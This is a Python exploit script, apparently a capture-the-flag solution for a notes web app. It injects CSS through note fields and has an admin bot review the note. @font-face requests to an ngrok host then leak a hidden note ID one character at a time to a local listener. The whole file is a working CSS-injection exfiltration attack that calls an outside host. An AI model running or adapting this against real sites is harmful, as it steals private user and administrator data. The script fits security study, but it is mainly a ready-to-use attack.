import requests
import http
from http.server import HTTPServer, BaseHTTPRequestHandler

s = requests.session()


url = "https://inst-e6f2c49c60324a21-hate-notes.chal.crewc.tf"

r1 = requests.post(f"{url}/api/auth/register", data="email=aa&password=aa", headers={"Content-Type":"application/x-www-form-urlencoded"})
r2 = requests.post(f"{url}/api/auth/login", data="email=aa&password=aa", headers={"Content-Type":"application/x-www-form-urlencoded"},allow_redirects=False)
token = r2.cookies["token"]
cookies = {"token":token}

# print(requests.get(f"{url}/api/notes/",cookies=cookies).text )



def addNote(content, title="/*"):

    r = requests.post(f"{url}/api/notes",cookies=cookies,data={"title":title,"content":content})

    return r.json().get("id")



css0 = "*/"


font = "@font-face { font-family: leak_<letter>; src: url('https://94ac1d9d144d.ngrok-free.app?leak=<letter>'); }"
style = "a[href^=\"<leak><letter>\"]{font-family:leak_<letter>;}"
cssEnd = "a{color:red;!impotant}"


leak = "/api/notes/b"

alphabet = "0123456789abcdef"


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # send 200 response
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", url)
        # send response headers
        self.end_headers()
        # send the body of the response

        #self.path
        #parsed = urlparse(self.path)
        # get the query string
        #query_string = parsed.query
        #agent = self.headers.get("User-Agent")

        global letter
        letter = self.path[-1]
        print(letter)

import _thread
import time

if __name__ == "__main__":
    httpd = HTTPServer(('localhost', 9000), MyHandler)
    _thread.start_new_thread(httpd.serve_forever,())

    letter = None

    for i in range(32):

        if i in [8,12,16,20]:
            leak += "-"

        print(leak)

        css = css0
        for l in alphabet:
            css += font.replace("<letter>",l)
        for l in alphabet:
            css += style.replace("<letter>",l).replace("<leak>",leak)

        css += cssEnd

        

        id0 = addNote(css,title="/*")
        id1 = addNote(f'*/</p><link rel="stylesheet" href="/static/api/notes/{id0}">',title="/*")

        print(f"{url}/dashboard?reviewNote={id1}")

        requests.post(f"{url}/report",cookies=cookies, data={"noteId":id1}, headers={"Content-Type":"application/x-www-form-urlencoded"})
        
        while True:
            #print(letter)
            if letter != None:

                leak += letter
                letter = None
                break
            if i == 0: time.sleep(5)
            else: time.sleep(0.3)

        print(leak)

    print(leak)
